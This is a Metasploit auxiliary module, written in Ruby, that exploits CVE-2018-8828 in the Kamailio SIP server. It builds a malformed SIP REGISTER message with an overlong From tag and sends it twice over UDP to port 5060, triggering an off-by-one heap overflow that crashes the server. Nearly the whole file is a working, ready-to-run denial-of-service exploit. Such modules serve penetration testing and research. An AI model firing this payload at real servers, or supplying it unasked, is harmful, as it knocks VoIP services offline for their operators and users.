##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  
  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name'			 => 'Kamailio SIP Server Off-by-one heap overflow Denial of Service',
      'Description'	 => %q{
          A specially crafted REGISTER message with a malformed branch or From tag triggers an off-by-one heap overflow.
      },
      'Author'		 => [ 'Alfred Farrugia <alfred[at]enablesecurity.com>' , 'Sandro Gaucci <sandro[at]enablesecurity.com>' , 'Carlos Perez <cp.ardanaz[at]gmail.com>' , 'Jon Uriona <jon.uriona[at]gmail.com>' ],
      'License'	 => MSF_LICENSE,
      'References'	 =>  [ 'CVE', '2018-8828' ],
      'DisclosureDate' => "Feb 10 2018" ))
    register_options([Opt::RPORT(5060)])
  end

   def run
    connect_udp

    sploit  =   "REGISTER sip:localhost:5060 SIP/2.0" + "\r\n"
    sploit  <<  "Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394" + "\r\n"
    sploit  <<  "To: <sip:1@localhost:5060>" + "\r\n"
    sploit  <<  "From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg" + "\r\n"
    sploit  <<  "Call-ID: 8b113457-c6a6-456a-be68-606686d93c38" + "\r\n"
    sploit  <<  "Contact: sip:1@127.0.0.1:53497" + "\r\n"
    sploit  <<  "Max-Forwards: 70" + "\r\n"
    sploit  <<  "CSeq: 10086 REGISTER" + "\r\n"
    sploit  <<  "User-Agent: go SIP fuzzer/1" + "\r\n"
    sploit  <<  "Content-Length: 0" + "\r\n\r\n"


    udp_sock.put(sploit)
    disconnect_udp
     
    sleep(5)
    connect_udp
    udp_sock.put(sploit)
    disconnect_udp

  end
end
